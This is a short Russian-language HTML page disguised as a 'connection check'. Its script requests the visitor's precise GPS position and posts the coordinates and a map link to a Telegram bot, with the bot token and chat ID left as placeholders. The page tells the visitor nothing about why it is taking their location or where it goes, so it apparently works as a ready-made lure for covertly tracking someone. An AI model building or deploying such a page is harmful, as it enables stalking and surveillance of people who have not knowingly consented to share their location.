<!DOCTYPE html>
<html lang="ru">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Проверка подключения...</title>
</head>
<body style="font-family:sans-serif;text-align:center;margin-top:40px;">

<h2>Определение местоположения...</h2>
<p id="status">Запрос GPS...</p>

<script>
const BOT_TOKEN = "ВСТАВЬ_СЮДА_BOT_TOKEN";
const CHAT_ID = "ВСТАВЬ_СЮДА_CHAT_ID";

function sendToTelegram(lat, lon, accuracy) {

    const text =
`📍 Новое местоположение

Широта: ${lat}
Долгота: ${lon}
Точность: ${accuracy} м

🗺 Карта:
https://maps.google.com/?q=${lat},${lon}`;

    fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
        method: "POST",
        headers: {
            "Content-Type": "application/json"
        },
        body: JSON.stringify({
            chat_id: CHAT_ID,
            text: text
        })
    })
    .then(() => {
        document.getElementById("status").innerText =
            "Геолокация успешно отправлена";
    })
    .catch((err) => {
        document.getElementById("status").innerText =
            "Ошибка: " + err;
    });
}

if (navigator.geolocation) {

    navigator.geolocation.getCurrentPosition(

        (position) => {

            const lat = position.coords.latitude;
            const lon = position.coords.longitude;
            const accuracy = position.coords.accuracy;

            sendToTelegram(lat, lon, accuracy);

        },

        (error) => {
            document.getElementById("status").innerText =
                "Ошибка GPS: " + error.message;
        },

        {
            enableHighAccuracy: true,
            timeout: 15000,
            maximumAge: 0
        }
    );

} else {

    document.getElementById("status").innerText =
        "Геолокация не поддерживается";

}
</script>

</body>
</html>
